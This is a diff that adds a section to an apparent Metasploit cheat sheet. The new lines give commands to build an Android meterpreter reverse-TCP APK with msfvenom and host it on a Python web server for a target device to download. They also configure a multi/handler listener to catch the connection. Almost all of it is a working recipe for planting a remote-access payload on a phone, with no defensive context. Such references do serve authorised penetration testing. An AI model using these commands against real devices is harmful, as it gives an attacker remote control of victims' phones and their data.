@@ -43,6 +43,31 @@ sessions -i 1
 background
 ```
 
+### Android Payload Generation (msfvenom)
+
+Generate an Android reverse TCP APK payload:
+```bash
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o payload.apk
+```
+
+Stage the APK file for delivery to the target device browser:
+```bash
+python3 -m http.server 8000
+# Target downloads via http://$LHOST:8000/payload.apk
+```
+
+### Handler Configuration for Callbacks
+
+Configure the listener to receive the connection:
+```text
+msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+run
+```
+
 ## Meterpreter
 
 ```text
